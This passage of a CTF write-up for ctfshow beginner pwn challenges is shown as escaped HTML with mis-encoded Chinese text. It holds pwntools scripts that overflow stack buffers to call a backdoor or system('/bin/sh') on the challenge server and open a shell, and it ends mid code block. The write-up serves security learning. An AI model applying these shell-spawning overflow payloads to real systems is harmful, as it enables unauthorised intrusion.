	width=&#34;1198&#34;
	height=&#34;261&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/113_hu_3770565c136ecdbb.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/113_hu_f3c84935d209b6bf.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;459&#34;
		data-flex-basis=&#34;1101px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å®é™…è§£é¢˜ä¸­ï¼Œ&lt;code&gt;ret&lt;/code&gt; åœ°å€éœ€è¦é’ˆå¯¹å½“å‰é¢˜ç›®åŠ¨æ€è·å–ï¼Œå¸¸ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å·¥å…·æŸ¥æ‰¾&lt;/strong&gt;ï¼šç”¨ &lt;code&gt;ROPgadget&lt;/code&gt; å·¥å…·ç›´æ¥æœç´¢ç¨‹åºä¸­çš„ &lt;code&gt;ret&lt;/code&gt; æŒ‡ä»¤ï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary ./pwn &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep ret
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28147&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;backdoor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400287&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 0x0000000000400287 : ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_039&#34;&gt;PWN_039
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š32ä½çš„ system(); &amp;ldquo;/bin/sh&amp;rdquo;ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_039&#34; &gt;PWN_039&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/114.png&#34;
	width=&#34;750&#34;
	height=&#34;210&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/114_hu_ffd0edb80748b701.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/114_hu_ed469b05f80e7568.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;357&#34;
		data-flex-basis=&#34;857px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æ²¡å¼€å¯canaryã€PIEä¿æŠ¤çš„ï¼Œå­˜åœ¨å¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´çš„å¯èƒ½ã€‚&lt;/p&gt;
&lt;p&gt;IDAï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/115.png&#34;
	width=&#34;1000&#34;
	height=&#34;450&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/115_hu_e696ee341380586.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/115_hu_a20ea7fd6a1243a2.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;32ä½çš„IDAåˆ†æ&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;533px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°å‘ç°æ ˆæº¢å‡ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/116.png&#34;
	width=&#34;596&#34;
	height=&#34;140&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/116_hu_1199a62a52d94a2a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/116_hu_d138901c5d88e68e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;425&#34;
		data-flex-basis=&#34;1021px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥è¯»å–50ä¸ªå­—ç¬¦ç»™bufï¼Œä½†bufå®¹é‡åªæœ‰14ï¼Œæ‰€ä»¥è¶…è¿‡14å°±ä¼šé€ æˆæ ˆæº¢å‡ºã€‚&lt;/p&gt;
&lt;p&gt;æ¥ç€åœ¨å‡½æ•°ç›®å½•çœ‹åˆ°hintå‡½æ•°æœ‰çŒ«è…»ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/117.png&#34;
	width=&#34;854&#34;
	height=&#34;390&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/117_hu_25ebd19a12518947.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/117_hu_27e696ef37eed855.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;218&#34;
		data-flex-basis=&#34;525px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆå¤§è‡´çš„expæ€è·¯å°±æ¥äº†ï¼šä¹Ÿå°±æ˜¯å…ˆcyclicå‡½æ•°ç”Ÿæˆåƒåœ¾å€¼è¦†ç›–å±€éƒ¨å˜é‡å’Œebpå¯„å­˜å™¨æœ¬èº«ï¼›ä½†æ˜¯åªæœ‰systemå‡½æ•°å’Œ/bin/shï¼Œå´æ²¡æœ‰system(â€œ/bin/shâ€);çš„åé—¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æ„é€ å‡ºæ¥ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ç¼–å†™expæ—¶ï¼Œå› ä¸ºç¨‹åºæ˜¯32ä½ï¼Œæ‰€ä»¥è¯´ä¸ç”¨å»è€ƒè™‘å®ƒçš„å †æ ˆå¹³è¡¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28216&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8048750&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™é‡Œçš„p32(0)ç­‰äº4å­—èŠ‚ï¼Œå¯ä»¥ç”¨å››ä¸ªaæˆ–è€…cyclic(4)ä»£æ›¿ä¹Ÿè¡Œï¼Œè¿™æ—¶32ä½ä¸‹systemå‡½æ•°çš„è¿”å›åœ°å€å ä½ç¬¦ï¼Œç„¶åå°±åˆ°æ‰§è¡Œ/bin/shï¼Œé‚£å°±æ˜¯è·³è½¬åˆ°å®ƒçš„åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/118.png&#34;
	width=&#34;1155&#34;
	height=&#34;119&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/118_hu_e5e93807f34b7bdd.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/118_hu_875bb0d0ab4ca27d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;/bin/shå­—ç¬¦ä¸²çš„åœ°å€&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;970&#34;
		data-flex-basis=&#34;2329px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·å­æˆ‘ä»¬å°±æ„é€ å‡ºsystem(&amp;quot;/bin/sh&amp;quot;);äº†ï¼Œç„¶åè¿›å…¥äº¤äº’æ¨¡å¼è·å¾—flagã€‚&lt;/p&gt;
&lt;p&gt;è¿™é¢˜ä¸»è¦è€ƒå¯Ÿæˆ‘ä»¬å¯¹äºå‡½æ•°çš„æ„é€ ä»¥åŠå‡½æ•°åœ°å€çš„æ‹¼æ¥ã€æ ˆçš„ç»“æ„ç»„æˆã€‚éœ€è¦å¤šçœ‹çœ‹æˆ‘çš„PWN-2å•Šã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_040&#34;&gt;PWN_040
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š64ä½çš„ system(); &amp;ldquo;/bin/sh&amp;rdquo;ã€‚&lt;/p&gt;
&lt;p&gt;IDA64ä½åˆ†æï¼Œè·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/119.png&#34;
	width=&#34;551&#34;
	height=&#34;149&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/119_hu_4361ba4a461d934e.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/119_hu_d335e677bd05e71e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;369&#34;
		data-flex-basis=&#34;887px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;checksecçœ‹åˆ°æœªæ‰“å¼€canaryä¿æŠ¤ï¼Œè€Œä¸”åœ¨ctfshowå‡½æ•°è¿™å‘ç°æœ‰æ ˆæº¢å‡ºã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›hintå‡½æ•°ï¼Œå‘ç°åé—¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/120.png&#34;
	width=&#34;540&#34;
	height=&#34;125&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/120_hu_ac0e24a915fef2c8.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/120_hu_a859f06ba4c0b768.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;432&#34;
		data-flex-basis=&#34;1036px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç”¨ROPgadgetå‘½ä»¤æŸ¥è¯¢retåœ°å€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary ./pwn &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep ret
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/121.png&#34;
	width=&#34;1224&#34;
	height=&#34;450&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/121_hu_749e2c86a93f982a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/121_hu_9f8cdc6270b0312a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;retåœ°å€æŸ¥è¯¢&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;272&#34;
		data-flex-basis=&#34;652px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢/bin/shçš„åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/122.png&#34;
	width=&#34;1135&#34;
	height=&#34;105&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/122_hu_8e4f1859de6b1d4c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/122_hu_772a3258af0a8472.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;/bin/shçš„åœ°å€ï¼š0x400808&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1080&#34;
		data-flex-basis=&#34;2594px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
